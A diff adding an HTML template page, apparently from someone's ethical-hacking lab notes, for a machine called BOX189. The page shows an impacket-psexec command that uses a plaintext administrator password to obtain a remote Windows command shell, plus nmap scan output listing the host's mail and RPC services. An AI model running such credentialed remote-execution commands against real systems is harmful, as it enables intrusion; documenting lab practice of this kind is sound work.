@@ -1,0 +1,66 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">BOX189</h1>
+    <p class="text">We have admin cred.</p>
+    <div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2]
+└─$ impacket-psexec relia.com/administrator:'vau!XCKjNQBv2$'@192.168.107.189 cmd.exe 
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on 192.168.107.189.....
+[*] Found writable share ADMIN$
+[*] Uploading file RCnXjTmb.exe
+[*] Opening SVCManager on 192.168.107.189.....
+[*] Creating service XinE on 192.168.107.189.....
+[*] Starting service XinE.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.20348.1129]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32></code></pre></div>
+
+<h2 class="subtitle">Nmap Output (SMTP)</h2>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2/189]
+└─$ cat tcp              
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-20 05:45 EST
+Warning: 192.168.214.189 giving up on port because retransmission cap hit (10).
+Nmap scan report for 192.168.214.189
+Host is up (0.10s latency).
+Not shown: 65519 closed tcp ports (reset)
+PORT      STATE SERVICE       VERSION
+25/tcp    open  smtp          hMailServer smtpd
+| smtp-commands: MAIL, SIZE 20480000, AUTH LOGIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+110/tcp   open  pop3          hMailServer pop3d
+|_pop3-capabilities: TOP UIDL USER
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+143/tcp   open  imap          hMailServer imapd
+|_imap-capabilities: SORT IMAP4 IMAP4rev1 ACL OK CHILDREN completed CAPABILITY QUOTA RIGHTS=texkA0001 NAMESPACE IDLE
+445/tcp   open  microsoft-ds?
+587/tcp   open  smtp          hMailServer smtpd
+| smtp-commands: MAIL, SIZE 20480000, AUTH LOGIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  msrpc         Microsoft Windows RPC</code></pre></div>
+
+</body>
+</html>
